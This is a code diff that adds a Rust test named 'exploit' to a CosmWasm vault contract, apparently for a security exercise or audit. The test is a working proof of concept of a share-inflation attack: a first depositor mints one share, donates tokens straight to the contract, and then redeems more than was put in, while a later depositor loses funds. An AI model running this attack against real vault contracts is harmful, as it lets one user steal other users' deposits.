@@ -125,4 +125,88 @@ pub mod tests {
             .unwrap();
         assert_eq!(bal.amount, Uint128::zero());
     }
+
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // mint funds to user
+        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));
+
+        // mint shares for user
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Mint {},
+            &[coin(1, DENOM)],
+        )
+        .unwrap();
+
+        // donate funds to contract
+        app.send_tokens(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &[coin(5_000, DENOM)],
+        )
+        .unwrap();
+
+        // mint funds to user2
+        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
+
+        // mint shares for user2
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Mint {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // query user
+        let balance: Balance = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::UserBalance {
+                    address: USER.to_string(),
+                },
+            )
+            .unwrap();
+
+        // burn shares for user
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Burn {
+                shares: balance.amount,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // burn shares for user2
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Burn {
+                shares: balance.amount,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // attacker receives more than they should
+        let bal = app.wrap().query_balance(USER, DENOM).unwrap();
+        assert!(bal.amount > Uint128::new(10_000));
+
+        // other user receives less than they should
+        let bal = app.wrap().query_balance(USER2, DENOM).unwrap();
+        assert!(bal.amount < Uint128::new(10_000));
+
+        let bal = app
+            .wrap()
+            .query_balance(contract_addr.to_string(), DENOM)
+            .unwrap();
+        assert_eq!(bal.amount, Uint128::zero());
+    }
 }
